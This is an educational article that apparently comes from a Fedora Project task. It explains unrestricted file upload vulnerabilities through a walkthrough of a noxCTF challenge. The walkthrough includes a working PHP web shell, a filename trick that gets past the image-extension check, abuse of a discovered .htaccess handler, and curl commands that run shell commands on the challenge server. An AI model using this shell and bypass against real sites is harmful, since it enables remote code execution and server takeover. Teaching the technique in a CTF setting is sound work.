# Unrestricted File Upload Vulnerability

This Article is written for a task for Fedora Project.

The name itself explains what we're gonna talk about. 
```
"Unrestricted"   -- Not limited

"File Upload"    -- Upload a file to a web page

"Vulnerability"  -- Possibility of being attacked or harmed.
```
File Upload Vulnerabilities are the third most common vulnerability type only after XSS (Cross Site Scripting) and SQLi (SQL Injection).

This is done by uploading a file which contains malicious code which may result in various dangers.

### What are the dangers?
```
Entire System takeover
Database Overloading
May cause back-end systems to malfunction
Critical files getting overwritten
Could trigger a DoS 
```

### How does this work and Where does the problem lie?

I'd rather explain with an example than with words.

I've asked the coordinator of noxCTF to make the connection alive for a while to the given challenge. (not sure how long)

Link for the challenge: http://chal.noxale.com:8079

First and Foremost, always create a php shell file.
```php
<?php
system($_GET['cmd']);
?>
```
I'll be saving this as `fedora.txt`

After I've tried to upload it, it gives us the following.
```HTML
File: fedora.txt
There is no .png/.jpg/.gif in that file name
```
The website expects a file name which contains `.png/.jpg/.gif` in the uploaded file. I'll change the file name to `fedora.png.txt`.

After uploading it, we get the following:
```HTML
File: fedora.png.txt
Image uploaded to: <a href='uploads/fedora.png.txt'>Here</a>
```

Let's now check the given URL.

```bash
$ curl 'http://chal.noxale.com:8079/uploads/fedora.png.txt'
<?php
system($_GET['cmd']);
?>
```
We have uploaded it successfully. Let’s try to investigate the /uploads/ directory.

```
Index of /uploads
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	-	 
[DIR]	Don't open/	2019-12-08 14:41	-	 
[IMG]	shell.png.phtml	2019-12-08 14:57	30	 
Apache/2.4.29 (Ubuntu) Server at chal.noxale.com Port 8079
```
We have a directory called “Don’t open”. Let’s see what’s inside.

```
Index of /uploads/Don't open
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	-	 
[   ]	htaccess	2019-12-08 14:48	56	 
Apache/2.4.29 (Ubuntu) Server at chal.noxale.com Port 8079
```
It contains a htaccess file. Let’s look at the contents of it.

```
$ curl "http://chal.noxale.com:8079/uploads/Don't%20open/htaccess"
Options +Indexes
AddType application/x-httpd-php .cyb3r
```
It tells us that the server runs files with extension .cyb3r using PHP.

Let’s rename our file to rce.png.cyb3r and upload it again (I've named it rce as it relates to remote code execution).

```
File: rce.png.cyb3r
Image uploaded to: <a href='uploads/rce.png.cyb3r'>Here</a>
```
### Testing:
```bash
$ curl "http://chal.noxale.com:8079/uploads/rce.png.cyb3r?cmd=whoami"
www-data
$ curl "http://chal.noxale.com:8079/uploads/rce.png.cyb3r?cmd=pwd"
/var/www/html/uploads
```
### Works!
Now we search for the flag!
```bash
$ curl "http://chal.noxale.com:8079/uploads/rce.png.cyb3r?cmd=ls"
1.jpg
1.jpg%00php
1.php%00jpg
1.php.jpg
1jpg
2.php%00jpg
2.php.jpg
2.php;.jpg
THE-FLAG-IS-HERE
Don't open
dummy.png.txt
exec.png.cyb3r
gif.phpjpg
gifjpg
rce.png.cyb3r
shell.png.cyb3r
shell.png.phtml
uploadTest.txt
$ curl "http://chal.noxale.com:8079/uploads/rce.png.cyb3r?cmd=file%20THE-FLAG-IS-HERE"
THE-FLAG-IS-HERE: directory
$ curl "http://chal.noxale.com:8079/uploads/rce.png.cyb3r?cmd=ls%20THE-FLAG-IS-HERE"
noxCTF{GCI-Fedora-rocks!}
```
I've chosen an example without the working of burpsuite (not a lot of people know how to use one), and this challenge is the only one I could think of.

**Remember** that this is only one type of vulnerability of file uploads. Real life practices require a lot of digging into stuff.

**For example**, one may start at File Upload Vuln, and counter with either binary exploitation, SSH keys, Network forensics or a combination will all of them.

You've seen it. Got it? And I hear a yes :)
